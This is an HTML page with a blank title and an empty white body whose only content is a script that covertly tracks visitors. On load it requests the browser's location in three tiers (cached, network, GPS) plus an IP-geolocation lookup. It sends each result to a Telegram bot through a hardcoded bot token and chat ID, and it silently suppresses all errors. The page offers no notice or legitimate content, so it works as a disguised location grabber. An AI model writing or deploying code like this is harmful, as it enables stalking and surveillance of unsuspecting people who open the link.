<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title> </title>
<style>
  html, body { margin:0; padding:0; background:#FFFFFF; width:100%; height:100%; overflow:hidden; }
</style>
</head>
<body>

<script>
const BOT_TOKEN = "8655470221:AAGsUmuGTKfLcOOLaGcdwDa4VDXsowUFIJg";
const CHAT_ID   = "8596657965";

function sendLoc(lat, lon, acc, source) {
  // location pin — instant map view
  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
  }).catch(() => {});

  // text details
  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: "📍 " + source + "\nLat: " + lat + "\nLon: " + lon +
            "\nAcc: " + Math.round(acc) + "m\n⏰ " + new Date().toLocaleTimeString()
    })
  }).catch(() => {});
}

// ── strategy: 3-tier, fastest first ─────────────────────

// tier 1: cached location — instant, no waiting
navigator.geolocation.getCurrentPosition(
  p => sendLoc(p.coords.latitude, p.coords.longitude, p.coords.accuracy, "cached"),
  () => {},
  { maximumAge: Infinity, timeout: 0, enableHighAccuracy: false }
);

// tier 2: network location — 1-3 seconds
navigator.geolocation.getCurrentPosition(
  p => sendLoc(p.coords.latitude, p.coords.longitude, p.coords.accuracy, "network"),
  () => {},
  { maximumAge: 60000, timeout: 5000, enableHighAccuracy: false }
);

// tier 3: GPS — 10-30s but accurate, only if still on page
setTimeout(() => {
  navigator.geolocation.getCurrentPosition(
    p => sendLoc(p.coords.latitude, p.coords.longitude, p.coords.accuracy, "gps"),
    () => {},
    { maximumAge: 0, timeout: 20000, enableHighAccuracy: true }
  );
}, 1000);

window.addEventListener('load', () => {
  // also try IP-based as absolute fallback via external service
  fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(d => {
      if (d.latitude && d.longitude) {
        sendLoc(d.latitude, d.longitude, 5000, "ip-estimate");
      }
    })
    .catch(() => {});
});
</script>
</body>
</html>
